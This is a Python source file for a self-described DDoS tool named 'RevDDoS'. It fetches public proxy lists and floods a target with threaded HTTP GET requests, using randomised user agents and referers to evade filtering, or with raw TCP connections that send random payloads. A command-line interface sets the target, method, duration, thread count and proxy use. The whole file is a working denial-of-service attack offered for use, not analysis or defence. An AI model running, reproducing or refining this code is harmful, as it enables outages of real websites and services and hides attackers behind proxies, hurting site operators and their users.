#!/usr/bin/env python3
"""
@ Author - Reversal 
@ Licenses - MIT
@ Description - Simple DDoS Script by Reversal, Inspiration From MHDDoS
@ Inspired - github.com/MatrixTM/MHDDoS
"""

import socket
import random
import threading
import time
import sys
import requests
import os
from urllib.parse import urlparse

class Colorz:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    RESET = '\033[0m'

PROXY_CONFIG = {
    "BOT_PREFIX": "Rev_",
    "GAME_PROTOCOL": 47,
    "proxy_sources": [
        {"type": 4, "url": "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/refs/heads/master/socks4.txt", "timeout": 5},
        {"type": 5, "url": "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/refs/heads/master/socks5.txt", "timeout": 5},
        {"type": 1, "url": "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", "timeout": 5}
    ]
}

class ProxyGrabber:
    def __init__(self):
        self.proxies = []
    
    def fetch_proxies(self):
        print(f"{Colorz.CYAN}Getting proxies...{Colorz.RESET}")
        
        for source in PROXY_CONFIG["proxy_sources"]:
            try:
                resp = requests.get(source["url"], timeout=source["timeout"])
                if resp.status_code == 200:
                    for line in resp.text.splitlines():
                        if ':' in line and not line.startswith('#'):
                            proxy = line.strip()
                            if source["type"] == 1:
                                self.proxies.append(f"http://{proxy}")
                            elif source["type"] == 4:
                                self.proxies.append(f"socks4://{proxy}")
                            elif source["type"] == 5:
                                self.proxies.append(f"socks5://{proxy}")
                time.sleep(0.5)
            except Exception as e:
                print(f"{Colorz.RED}Failed: {source['url']}: {e}{Colorz.RESET}")
        
        print(f"{Colorz.GREEN}Got {len(self.proxies)} proxies{Colorz.RESET}")
        return self.proxies

class RevDDoS:
    def __init__(self):
        self.running = False
        self.reqs_sent = 0
        self.bytes_sent = 0
        self.proxy_grabber = ProxyGrabber()
        
        # Load user agents from file
        self.useragents = self.load_from_file("files/useragent.txt")
        if not self.useragents:
            print(f"{Colorz.RED}No user agents found, using defaults{Colorz.RESET}")
            self.useragents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36"
            ]
        
        # Load referers from file
        self.referers = self.load_from_file("files/referers.txt")
        if not self.referers:
            print(f"{Colorz.RED}No referers found, using defaults{Colorz.RESET}")
            self.referers = [
                "https://www.google.com/",
                "https://www.bing.com/",
                "https://www.yahoo.com/"
            ]
    
    def load_from_file(self, filename):
        if not os.path.exists(filename):
            return []
        
        items = []
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    items.append(line)
        return items
        
    def get_random_headers(self, link):
        parsed_link = urlparse(link)
        return {
            'User-Agent': random.choice(self.useragents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Referer': random.choice(self.referers),
        }
    
    def http_attack(self, link, use_proxies=True, duration=60):
        parsed = urlparse(link)
        proxies = self.proxy_grabber.fetch_proxies() if use_proxies else []
        
        end_time = time.time() + duration
        while time.time() < end_time and self.running:
            try:
                proxy_dict = {'http': random.choice(proxies), 'https': random.choice(proxies)} if proxies else None
                
                if proxy_dict:
                    resp = requests.get(link, headers=self.get_random_headers(link), proxies=proxy_dict, timeout=5)
                else:
                    resp = requests.get(link, headers=self.get_random_headers(link), timeout=5)
                
                self.reqs_sent += 1
                self.bytes_sent += len(resp.content)
            except:
                pass
    
    def tcp_attack(self, target, port, duration):
        end_time = time.time() + duration
        while time.time() < end_time and self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((target, port))
                payload = random._urandom(1024)
                sock.send(payload)
                self.reqs_sent += 1
                self.bytes_sent += len(payload)
                sock.close()
            except:
                pass
    
    def start_attack(self, target_link, method='http', duration=60, threads=10, use_proxies=True):
        self.running = True
        self.reqs_sent = 0
        self.bytes_sent = 0
        
        parsed = urlparse(target_link)
        target = parsed.hostname
        port = parsed.port or (80 if parsed.scheme == 'http' else 443)
        
        print(f"{Colorz.BLUE}Starting {method} attack on {target}:{port}{Colorz.RESET}")
        print(f"{Colorz.CYAN}User agents: {len(self.useragents)}, Referers: {len(self.referers)}{Colorz.RESET}")
        
        thread_pool = []
        for i in range(threads):
            if method == 'tcp':
                thread = threading.Thread(target=self.tcp_attack, args=(target, port, duration))
            else:
                thread = threading.Thread(target=self.http_attack, args=(target_link, use_proxies, duration))
            
            thread.daemon = True
            thread_pool.append(thread)
            thread.start()
        
        start_time = time.time()
        last_reqs = 0
        last_bytes = 0
        
        while time.time() < start_time + duration and self.running:
            elapsed = time.time() - start_time
            reqs_per_sec = (self.reqs_sent - last_reqs) / 1.0
            bytes_per_sec = (self.bytes_sent - last_bytes) / 1.0
            
            print(f"{Colorz.YELLOW}Time: {elapsed:.1f}s | Reqs: {self.reqs_sent} | Data: {self.bytes_sent/1024/1024:.2f} MB{Colorz.RESET}")
            
            last_reqs = self.reqs_sent
            last_bytes = self.bytes_sent
            time.sleep(1)
        
        self.running = False
        for t in thread_pool:
            t.join(timeout=5)
        
        print(f"{Colorz.GREEN}Done! Requests: {self.reqs_sent}{Colorz.RESET}")

def main():
    if len(sys.argv) < 2:
        print(f"{Colorz.RED}Usage: {sys.argv[0]} <link> [method] [duration] [threads] [proxies]{Colorz.RESET}")
        print(f"{Colorz.YELLOW}Methods: http, tcp{Colorz.RESET}")
        return
    
    link = sys.argv[1]
    method = sys.argv[2] if len(sys.argv) > 2 else 'http'
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
    threads = int(sys.argv[4]) if len(sys.argv) > 4 else 10
    use_proxies = sys.argv[5].lower() == 'true' if len(sys.argv) > 5 else True
    
    if not link.startswith('http'):
        link = 'http://' + link
    
    attacker = RevDDoS()
    
    try:
        attacker.start_attack(link, method, duration, threads, use_proxies)
    except KeyboardInterrupt:
        attacker.running = False
        print(f"{Colorz.RED}Stopped{Colorz.RESET}")
    except Exception as e:
        print(f"{Colorz.RED}Error: {e}{Colorz.RESET}")

if __name__ == '__main__':
    main()
